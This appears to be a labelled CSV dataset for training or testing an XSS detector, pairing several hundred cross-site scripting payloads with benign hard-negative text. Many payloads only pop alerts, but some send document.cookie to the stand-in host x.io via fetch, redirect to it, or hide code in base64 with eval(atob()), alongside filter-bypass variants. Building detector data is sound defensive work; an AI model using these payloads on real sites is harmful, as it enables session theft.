text,label,attack_type,generator
"<div onmouseover=""location='//x.io'"">",1,xss,deepseek-r1
'><body onclick=alert(1)>,1,xss,deepseek-r1
<iframe onclick=alert(1)>,1,xss,deepseek-r1
<details onload=location='//x.io'>,1,xss,deepseek-r1
'><object onmouseover=location='//x.io'>,1,xss,deepseek-r1
"""><iframe ontoggle=print()>",1,xss,deepseek-r1
'><script onerror=confirm(1)>,1,xss,deepseek-r1
"<script onmouseover=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
"""><iframe onmouseover=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
"""><iframe onstart=print()>",1,xss,deepseek-r1
<iframe onstart=location='//x.io'>,1,xss,deepseek-r1
"""><details onmouseover=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
"<details onanimationstart=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
<input onerror=confirm(1)>,1,xss,deepseek-r1
"<div onpointerover=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
"<object onanimationstart=""alert(1)"">",1,xss,deepseek-r1
"""><svg onmouseover=confirm(1)>",1,xss,deepseek-r1
"""><div oninput=alert(document.cookie)>",1,xss,deepseek-r1
"<video onclick=""alert(document.cookie)"">",1,xss,deepseek-r1
"""><body onerror=alert(document.domain)>",1,xss,deepseek-r1
"<img onclick=""location='//x.io'"">",1,xss,deepseek-r1
"""><svg ontoggle=confirm(1)>",1,xss,deepseek-r1
'><marquee onpointerover=alert(document.cookie)>,1,xss,deepseek-r1
<iframe onmouseover=location='//x.io'>,1,xss,deepseek-r1
"<input onfocus=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
'><details oninput=alert(document.domain)>,1,xss,deepseek-r1
'><div onload=alert(1)>,1,xss,deepseek-r1
"<iframe onpointerover=""alert(document.domain)"">",1,xss,deepseek-r1
"<audio onerror=""print()"">",1,xss,deepseek-r1
"<details onmouseover=""alert(document.domain)"">",1,xss,deepseek-r1
"<img onanimationstart=""alert(document.domain)"">",1,xss,deepseek-r1
"""><input onmouseover=print()>",1,xss,deepseek-r1
'><details onanimationstart=location='//x.io'>,1,xss,deepseek-r1
'><iframe onpointerover=confirm(1)>,1,xss,deepseek-r1
"<object onerror=""print()"">",1,xss,deepseek-r1
"""><iframe onclick=location='//x.io'>",1,xss,deepseek-r1
'><audio onanimationstart=alert(document.cookie)>,1,xss,deepseek-r1
"""><video onmouseover=location='//x.io'>",1,xss,deepseek-r1
<img onpointerover=alert(document.cookie)>,1,xss,deepseek-r1
"""><details onload=print()>",1,xss,deepseek-r1
<div onstart=alert(document.cookie)>,1,xss,deepseek-r1
'><input onpointerover=alert(document.domain)>,1,xss,deepseek-r1
<details onfocus=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
'><input onanimationstart=confirm(1)>,1,xss,deepseek-r1
"<marquee onload=""print()"">",1,xss,deepseek-r1
'><marquee ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
"<details onload=""location='//x.io'"">",1,xss,deepseek-r1
"<object onpointerover=""alert(1)"">",1,xss,deepseek-r1
"<script onstart=""confirm(1)"">",1,xss,deepseek-r1
"""><audio onanimationstart=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
"""><video onfocus=print()>",1,xss,deepseek-r1
'><iframe onerror=alert(1)>,1,xss,deepseek-r1
'><video onfocus=print()>,1,xss,deepseek-r1
<object onclick=confirm(1)>,1,xss,deepseek-r1
'><body ontoggle=alert(document.cookie)>,1,xss,deepseek-r1
"<video onfocus=""alert(1)"">",1,xss,deepseek-r1
"""><img onerror=alert(1)>",1,xss,deepseek-r1
<div onfocus=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
'><a onmouseover=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
<a onload=alert(document.cookie)>,1,xss,deepseek-r1
"<iframe onerror=""confirm(1)"">",1,xss,deepseek-r1
"<audio onload=""alert(document.cookie)"">",1,xss,deepseek-r1
'><video onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
'><script onload=alert(1)>,1,xss,deepseek-r1
<a onclick=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
<img onanimationstart=confirm(1)>,1,xss,deepseek-r1
"""><img onfocus=location='//x.io'>",1,xss,deepseek-r1
"<object onload=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
"<svg onerror=""alert(1)"">",1,xss,deepseek-r1
'><details onfocus=alert(1)>,1,xss,deepseek-r1
"<details onmouseover=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
"""><marquee onload=alert(document.cookie)>",1,xss,deepseek-r1
<scr<script>ipt>alert(document.cookie)</script>,1,xss,deepseek-r1
<input onmouseover=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
'><input onload=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
"<details oninput=""print()"">",1,xss,deepseek-r1
<script ontoggle=alert(document.cookie)>,1,xss,deepseek-r1
'><a onload=print()>,1,xss,deepseek-r1
"""><marquee onerror=fetch('//x.io/'+document.cookie)>",1,xss,deepseek-r1
"<iframe onfocus=""alert(document.domain)"">",1,xss,deepseek-r1
"<input onerror=""print()"">",1,xss,deepseek-r1
<video oninput=alert(1)>,1,xss,deepseek-r1
"""><marquee oninput=confirm(1)>",1,xss,deepseek-r1
'><object onclick=alert(document.domain)>,1,xss,deepseek-r1
'><iframe onload=confirm(1)>,1,xss,deepseek-r1
<audio onload=alert(document.domain)>,1,xss,deepseek-r1
"<input onclick=""print()"">",1,xss,deepseek-r1
"""><div onerror=location='//x.io'>",1,xss,deepseek-r1
'><video oninput=alert(document.cookie)>,1,xss,deepseek-r1
"<iframe onfocus=""confirm(1)"">",1,xss,deepseek-r1
"""><audio onerror=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
'><div onpointerover=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
'><script onstart=print()>,1,xss,deepseek-r1
"<div oninput=""alert(1)"">",1,xss,deepseek-r1
'><div onmouseover=alert(document.cookie)>,1,xss,deepseek-r1
<object onclick=alert(document.domain)>,1,xss,deepseek-r1
<audio onpointerover=alert(document.cookie)>,1,xss,deepseek-r1
'><object oninput=confirm(1)>,1,xss,deepseek-r1
"""><body onmouseover=confirm(1)>",1,xss,deepseek-r1
<img onerror=alert(document.domain)>,1,xss,deepseek-r1
<script onfocus=alert(document.domain)>,1,xss,deepseek-r1
'><details onclick=location='//x.io'>,1,xss,deepseek-r1
<input onfocus=alert(1)>,1,xss,deepseek-r1
"""><body onload=print()>",1,xss,deepseek-r1
'><video oninput=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
'><input onanimationstart=alert(document.domain)>,1,xss,deepseek-r1
'><a onanimationstart=location='//x.io'>,1,xss,deepseek-r1
"""><details onstart=print()>",1,xss,deepseek-r1
"<iframe onanimationstart=""confirm(1)"">",1,xss,deepseek-r1
'><details onanimationstart=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
'><input onfocus=print()>,1,xss,deepseek-r1
"""><audio onmouseover=fetch('//x.io/'+document.cookie)>",1,xss,deepseek-r1
<audio onclick=alert(document.cookie)>,1,xss,deepseek-r1
"<iframe onclick=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
"<body onstart=""alert(document.domain)"">",1,xss,deepseek-r1
"""><input onstart=alert(document.cookie)>",1,xss,deepseek-r1
"<div ontoggle=""alert(document.domain)"">",1,xss,deepseek-r1
"<video onpointerover=""print()"">",1,xss,deepseek-r1
<object onload=alert(1)>,1,xss,deepseek-r1
"<svg ontoggle=""alert(document.cookie)"">",1,xss,deepseek-r1
"<iframe onmouseover=""confirm(1)"">",1,xss,deepseek-r1
'><audio onpointerover=alert(document.cookie)>,1,xss,deepseek-r1
"<script onstart=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
<audio onclick=alert(1)>,1,xss,deepseek-r1
"""><svg onerror=location='//x.io'>",1,xss,deepseek-r1
<img oninput=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
<object onfocus=location='//x.io'>,1,xss,deepseek-r1
'><a onfocus=alert(document.cookie)>,1,xss,deepseek-r1
<a oninput=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
<marquee onmouseover=alert(document.cookie)>,1,xss,deepseek-r1
<details onanimationstart=confirm(1)>,1,xss,deepseek-r1
"""><video oninput=alert(document.cookie)>",1,xss,deepseek-r1
"<script onanimationstart=""print()"">",1,xss,deepseek-r1
'><object ontoggle=location='//x.io'>,1,xss,deepseek-r1
"""><details onload=alert(document.cookie)>",1,xss,deepseek-r1
"""><details onclick=print()>",1,xss,deepseek-r1
<scr<script>ipt>confirm(1)</script>,1,xss,deepseek-r1
"<img onload=""alert(document.cookie)"">",1,xss,deepseek-r1
'><audio onstart=alert(document.domain)>,1,xss,deepseek-r1
'><a onfocus=print()>,1,xss,deepseek-r1
"""><iframe onstart=alert(1)>",1,xss,deepseek-r1
'><audio onstart=alert(1)>,1,xss,deepseek-r1
"""><input onstart=alert(document.domain)>",1,xss,deepseek-r1
'><details onfocus=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
"""><details onpointerover=confirm(1)>",1,xss,deepseek-r1
<body onstart=print()>,1,xss,deepseek-r1
"<div onfocus=""alert(document.domain)"">",1,xss,deepseek-r1
'><iframe onload=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
"<div onerror=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
"""><img onclick=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
<details onanimationstart=print()>,1,xss,deepseek-r1
<details onstart=alert(1)>,1,xss,deepseek-r1
<object onfocus=alert(document.domain)>,1,xss,deepseek-r1
'><a oninput=location='//x.io'>,1,xss,deepseek-r1
"""><a onanimationstart=alert(document.domain)>",1,xss,deepseek-r1
<input onmouseover=alert(document.domain)>,1,xss,deepseek-r1
"<iframe onclick=""print()"">",1,xss,deepseek-r1
"""><input onmouseover=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
<script ontoggle=print()>,1,xss,deepseek-r1
"<script onstart=""alert(document.cookie)"">",1,xss,deepseek-r1
"""><input onload=alert(document.domain)>",1,xss,deepseek-r1
<ScRiPt>FETCH('//X.IO/'+DOCUMENT.COOKIE)</ScRiPt>,1,xss,deepseek-r1
"<input onpointerover=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
"""><video ontoggle=alert(1)>",1,xss,deepseek-r1
"""><details onstart=location='//x.io'>",1,xss,deepseek-r1
<object onpointerover=print()>,1,xss,deepseek-r1
'><audio ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
"<marquee onanimationstart=""confirm(1)"">",1,xss,deepseek-r1
'><audio onload=alert(document.domain)>,1,xss,deepseek-r1
<svg onmouseover=alert(1)>,1,xss,deepseek-r1
"""><iframe onanimationstart=alert(1)>",1,xss,deepseek-r1
'><body onclick=alert(document.cookie)>,1,xss,deepseek-r1
<video onclick=confirm(1)>,1,xss,deepseek-r1
"""><div onpointerover=fetch('//x.io/'+document.cookie)>",1,xss,deepseek-r1
<div onerror=confirm(1)>,1,xss,deepseek-r1
"<img onmouseover=""location='//x.io'"">",1,xss,deepseek-r1
'><object onpointerover=confirm(1)>,1,xss,deepseek-r1
'><iframe onmouseover=alert(document.domain)>,1,xss,deepseek-r1
"<details onerror=""alert(document.cookie)"">",1,xss,deepseek-r1
<video onmouseover=alert(document.domain)>,1,xss,deepseek-r1
'><details onfocus=print()>,1,xss,deepseek-r1
"<a onerror=""alert(document.cookie)"">",1,xss,deepseek-r1
<input onerror=location='//x.io'>,1,xss,deepseek-r1
'><audio onerror=alert(1)>,1,xss,deepseek-r1
"""><iframe ontoggle=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
'><video onpointerover=alert(document.cookie)>,1,xss,deepseek-r1
'><div onstart=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
'><iframe onerror=alert(document.cookie)>,1,xss,deepseek-r1
"""><svg onmouseover=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
"""><audio oninput=confirm(1)>",1,xss,deepseek-r1
<body onanimationstart=alert(1)>,1,xss,deepseek-r1
"""><div onfocus=fetch('//x.io/'+document.cookie)>",1,xss,deepseek-r1
"""><a onerror=print()>",1,xss,deepseek-r1
<script onclick=alert(document.cookie)>,1,xss,deepseek-r1
'><img onmouseover=confirm(1)>,1,xss,deepseek-r1
"""><audio onload=fetch('//x.io/'+document.cookie)>",1,xss,deepseek-r1
"<marquee ontoggle=""alert(document.domain)"">",1,xss,deepseek-r1
"""><a ontoggle=alert(document.domain)>",1,xss,deepseek-r1
"<a onfocus=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
<video onstart=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
"<marquee onstart=""location='//x.io'"">",1,xss,deepseek-r1
"<script onpointerover=""alert(document.domain)"">",1,xss,deepseek-r1
<body onerror=alert(document.cookie)>,1,xss,deepseek-r1
"<script oninput=""confirm(1)"">",1,xss,deepseek-r1
'><svg onfocus=alert(1)>,1,xss,deepseek-r1
"""><img ontoggle=fetch('//x.io/'+document.cookie)>",1,xss,deepseek-r1
"<a onanimationstart=""print()"">",1,xss,deepseek-r1
'><marquee onclick=alert(document.domain)>,1,xss,deepseek-r1
'><svg onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
'><body onstart=alert(document.cookie)>,1,xss,deepseek-r1
"""><marquee onload=confirm(1)>",1,xss,deepseek-r1
'><video onload=location='//x.io'>,1,xss,deepseek-r1
"""><audio onload=alert(document.cookie)>",1,xss,deepseek-r1
"<input onload=""print()"">",1,xss,deepseek-r1
'><body ontoggle=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
"""><audio onerror=alert(document.cookie)>",1,xss,deepseek-r1
<audio oninput=confirm(1)>,1,xss,deepseek-r1
"""><img ontoggle=confirm(1)>",1,xss,deepseek-r1
"""><div oninput=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
"""><div onmouseover=alert(1)>",1,xss,deepseek-r1
<video oninput=print()>,1,xss,deepseek-r1
<script onanimationstart=location='//x.io'>,1,xss,deepseek-r1
<div onload=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
<details onerror=location='//x.io'>,1,xss,deepseek-r1
'><script onmouseover=location='//x.io'>,1,xss,deepseek-r1
"<object onclick=""alert(1)"">",1,xss,deepseek-r1
"<input onclick=""alert(1)"">",1,xss,deepseek-r1
<body onmouseover=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
"""><audio onclick=alert(document.cookie)>",1,xss,deepseek-r1
"<video oninput=""print()"">",1,xss,deepseek-r1
<object onanimationstart=location='//x.io'>,1,xss,deepseek-r1
"""><script onfocus=print()>",1,xss,deepseek-r1
'><svg onanimationstart=confirm(1)>,1,xss,deepseek-r1
'><script oninput=alert(document.cookie)>,1,xss,deepseek-r1
"""><svg onload=alert(document.domain)>",1,xss,deepseek-r1
"<img onpointerover=""alert(document.domain)"">",1,xss,deepseek-r1
'><audio onerror=alert(document.domain)>,1,xss,deepseek-r1
'><a onmouseover=location='//x.io'>,1,xss,deepseek-r1
'><details onpointerover=confirm(1)>,1,xss,deepseek-r1
"<object onerror=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
"""><details ontoggle=alert(document.cookie)>",1,xss,deepseek-r1
"<img onfocus=""confirm(1)"">",1,xss,deepseek-r1
<img onclick=confirm(1)>,1,xss,deepseek-r1
<iframe onstart=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
"<body onpointerover=""print()"">",1,xss,deepseek-r1
'><object onfocus=location='//x.io'>,1,xss,deepseek-r1
"<details oninput=""alert(1)"">",1,xss,deepseek-r1
"<body onload=""alert(document.cookie)"">",1,xss,deepseek-r1
"<iframe onanimationstart=""location='//x.io'"">",1,xss,deepseek-r1
'><script onload=confirm(1)>,1,xss,deepseek-r1
<a ontoggle=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
'><video onload=alert(1)>,1,xss,deepseek-r1
<svg onmouseover=location='//x.io'>,1,xss,deepseek-r1
The regex \bword\b matches the expected input format.,0,benign,held_out_benign
The SELECT statement retrieves rows; use WHERE to filter and ORDER BY to sort.,0,benign,held_out_benign
if (count >= 10 || retry) { throw new Error('x'); },0,benign,held_out_benign
"git commit -m ""fix: resolve null pointer in auth module""",0,benign,held_out_benign
Smith & Sons Law Firm LLC,0,benign,held_out_benign
Contact Müller at 49 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
Open the file at C:\Users\Admin\setup.bat and edit line 42.,0,benign,held_out_benign
Contact Kowalski at 86 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
Email a_b-c@company.org or ping @a_b-c on Slack.,0,benign,held_out_benign
if (x != y && z > 0) { grantAccess(); },0,benign,held_out_benign
Contact Müller at 61 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
if (flag & MASK) { throw new Error('x'); },0,benign,held_out_benign
Contact John at 5 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
Email dev.ops@company.com or ping @dev.ops on Slack.,0,benign,held_out_benign
Contact Ng at 60 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
Contact van der Berg at 28 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
Open the file at C:\Users\Admin\main.py and edit line 42.,0,benign,held_out_benign
if (a['key'] == b['key']) { queue.push(item); },0,benign,held_out_benign
Email a_b-c@company.co.uk or ping @a_b-c on Slack.,0,benign,held_out_benign
Contact O'Brien at 89 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
Contact O'Brien at 46 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
Contact D'Angelo at 70 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
Contact Kowalski at 84 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
if (user.role == 'admin') { return true; },0,benign,held_out_benign
Email team+alerts@company.org or ping @team+alerts on Slack.,0,benign,held_out_benign
if (flag & MASK) { queue.push(item); },0,benign,held_out_benign
Recipe: mix 2 cups flour w/ 1 tsp salt; bake @ 350F for 20 min.,0,benign,held_out_benign
Contact Müller at 76 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
In the lecture we derived: A OR B = 1 when either is true.,0,benign,held_out_benign
Meeting notes 10/25: discussed Q3 <-> Q4 transition plan.,0,benign,held_out_benign
Contact Ng at 15 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
"She said ""1=1 is always true"" during the boolean-logic lecture.",0,benign,held_out_benign
Contact van der Berg at 10 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
if (count >= 10 || retry) { queue.push(item); },0,benign,held_out_benign
Contact Müller at 10 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
The onclick attribute runs a function when the element is clicked.,0,benign,held_out_benign
Contact María at 45 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
Contact Kowalski at 26 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
Contact O'Malley at 83 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
if (flag & MASK) { grantAccess(); },0,benign,held_out_benign
Contact Müller at 85 Baker St re: the <draft> proposal.,0,benign,held_out_benign
if (status == 200) { return true; },0,benign,held_out_benign
Contact John at 75 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
Contact Smith at 6 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
Contact O'Malley at 35 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
Contact Kowalski at 35 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
Contact Smith at 77 Baker St re: the <draft> proposal.,0,benign,held_out_benign
The regex ^https?://.+$ matches the expected input format.,0,benign,held_out_benign
Open the file at C:\Program Files\Tool\config.yml and edit line 42.,0,benign,held_out_benign
In the lecture we derived: 1 < n && n <= 100.,0,benign,held_out_benign
Email j.smith@company.org or ping @j.smith on Slack.,0,benign,held_out_benign
"Address: 42 O'Malley Ave, Apt #7, (near the park)",0,benign,held_out_benign
Email dev.ops@company.net or ping @dev.ops on Slack.,0,benign,held_out_benign
cost = qty * unit_price; if (cost > budget) { flag(); },0,benign,held_out_benign
Email a_b-c@company.net or ping @a_b-c on Slack.,0,benign,held_out_benign
"My favorite quote: ""to be or not to be"" -- Shakespeare",0,benign,held_out_benign
Contact van der Berg at 72 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
Open the file at /var/log/nginx/setup.bat and edit line 42.,0,benign,held_out_benign
Contact MacLeod at 99 Baker St re: the <draft> proposal.,0,benign,held_out_benign
Contact Müller at 22 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
Open the file at D:\Projects\app\error.log and edit line 42.,0,benign,held_out_benign
"123 O'Connell St, Dublin",0,benign,held_out_benign
Error code: 500 (Internal Server Error) -- see logs for details.,0,benign,held_out_benign
Contact O'Brien at 11 Baker St re: the <draft> proposal.,0,benign,held_out_benign
Contact María at 83 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
In the lecture we derived: SELECT-style set notation: {x | x > 0}.,0,benign,held_out_benign
Email j.smith@company.net or ping @j.smith on Slack.,0,benign,held_out_benign
Email dev.ops@company.io or ping @dev.ops on Slack.,0,benign,held_out_benign
Contact van der Berg at 4 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
"The regex (foo|bar){1,3} matches the expected input format.",0,benign,held_out_benign
Email team+alerts@company.io or ping @team+alerts on Slack.,0,benign,held_out_benign
Email j.smith@company.io or ping @j.smith on Slack.,0,benign,held_out_benign
if (status == 200) { log.info('ok'); },0,benign,held_out_benign
Contact Müller at 7 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
Contact D'Angelo at 65 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
Email dev.ops@company.org or ping @dev.ops on Slack.,0,benign,held_out_benign
Contact O'Malley at 46 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
Open the file at C:\Program Files\Tool\main.py and edit line 42.,0,benign,held_out_benign
Contact D'Angelo at 63 Baker St re: the <draft> proposal.,0,benign,held_out_benign
Contact O'Malley at 72 Baker St re: the <draft> proposal.,0,benign,held_out_benign
if (status == 200) { throw new Error('x'); },0,benign,held_out_benign
Escaping user input prevents script injection on the page.,0,benign,held_out_benign
Contact María at 4 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
if (x != y && z > 0) { queue.push(item); },0,benign,held_out_benign
Email team+alerts@company.net or ping @team+alerts on Slack.,0,benign,held_out_benign
Open the file at C:\Program Files\Tool\data\out.csv and edit line 42.,0,benign,held_out_benign
Contact María at 79 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
In the lecture we derived: dx/dt = 3x - 2.,0,benign,held_out_benign
if (count >= 10 || retry) { return true; },0,benign,held_out_benign
Open the file at ~/scripts/error.log and edit line 42.,0,benign,held_out_benign
Contact van der Berg at 19 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
Open the file at D:\Projects\app\setup.bat and edit line 42.,0,benign,held_out_benign
Contact O'Malley at 39 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
Contact María at 80 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
Open the file at C:\Users\Admin\config.yml and edit line 42.,0,benign,held_out_benign
Product SKU# ABC-123; Category: Electronics & Gadgets (in stock).,0,benign,held_out_benign
"The DROP command deletes a table, so use it carefully in migrations.",0,benign,held_out_benign
Email team+alerts@company.com or ping @team+alerts on Slack.,0,benign,held_out_benign
Contact John at 86 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
Contact Chen at 1 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
Open the file at /var/log/nginx/data\out.csv and edit line 42.,0,benign,held_out_benign
if (user.role == 'admin') { log.info('ok'); },0,benign,held_out_benign
Contact us at support@company.com or call (555) 123-4567.,0,benign,held_out_benign
Contact Ng at 12 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
if (a['key'] == b['key']) { log.info('ok'); },0,benign,held_out_benign
Open the file at C:\Program Files\Tool\error.log and edit line 42.,0,benign,held_out_benign
Open the file at D:\Projects\app\main.py and edit line 42.,0,benign,held_out_benign
if (x != y && z > 0) { throw new Error('x'); },0,benign,held_out_benign
Contact Smith at 87 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
Open the file at /var/log/nginx/error.log and edit line 42.,0,benign,held_out_benign
Wrap the content in <table> and <tr> tags to build the layout.,0,benign,held_out_benign
Email j.smith@company.com or ping @j.smith on Slack.,0,benign,held_out_benign
Contact O'Brien at 99 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
Contact Ng at 20 Baker St re: the <draft> proposal.,0,benign,held_out_benign
"Rated 4.5/5 stars -- ""great product, fast shipping!""",0,benign,held_out_benign
Contact Chen at 91 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
if (x != y && z > 0) { return true; },0,benign,held_out_benign
Contact D'Angelo at 60 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
Contact John at 57 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
Open the file at C:\Program Files\Tool\setup.bat and edit line 42.,0,benign,held_out_benign
Contact D'Angelo at 86 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
Open the file at C:\Users\Admin\error.log and edit line 42.,0,benign,held_out_benign
Email a_b-c@company.com or ping @a_b-c on Slack.,0,benign,held_out_benign
Email j.smith@company.co.uk or ping @j.smith on Slack.,0,benign,held_out_benign
if (user.role == 'admin') { queue.push(item); },0,benign,held_out_benign
Open the file at ~/scripts/setup.bat and edit line 42.,0,benign,held_out_benign
Use parameterised queries instead of string concatenation for safety.,0,benign,held_out_benign
Contact Chen at 10 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
Email team+alerts@company.co.uk or ping @team+alerts on Slack.,0,benign,held_out_benign
Contact Chen at 66 Baker St re: the <draft> proposal.,0,benign,held_out_benign
In the lecture we derived: P(A|B) = P(B|A)*P(A)/P(B).,0,benign,held_out_benign
Contact Smith at 66 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
Open the file at /var/log/nginx/main.py and edit line 42.,0,benign,held_out_benign
Contact Smith at 12 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
An <iframe> embeds another document inside the current page.,0,benign,held_out_benign
if (a['key'] == b['key']) { throw new Error('x'); },0,benign,held_out_benign
Contact Ng at 92 St. John's Rd re: the <draft> proposal.,0,benign,held_out_benign
Contact O'Malley at 62 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
"The regex [A-Z]{2,4}-\d+ matches the expected input format.",0,benign,held_out_benign
Contact D'Angelo at 9 Rue de l'Église re: the <draft> proposal.,0,benign,held_out_benign
Contact Smith at 75 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
Product SKU# ABC-123; Category: Electronics & Gadgets,0,benign,held_out_benign
Contact Smith at 9 O'Connell St re: the <draft> proposal.,0,benign,held_out_benign
Contact John at 1 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
Discount code SAVE20% applies to orders over $50.,0,benign,held_out_benign
Contact MacLeod at 40 King's Cross re: the <draft> proposal.,0,benign,held_out_benign
if (a['key'] == b['key']) { return true; },0,benign,held_out_benign
Contact MacLeod at 86 O'Malley Ave re: the <draft> proposal.,0,benign,held_out_benign
Contact O'Brien at 13 3rd Ave re: the <draft> proposal.,0,benign,held_out_benign
"Please review section 3.2(a) of the contract, re: pricing.",0,benign,held_out_benign
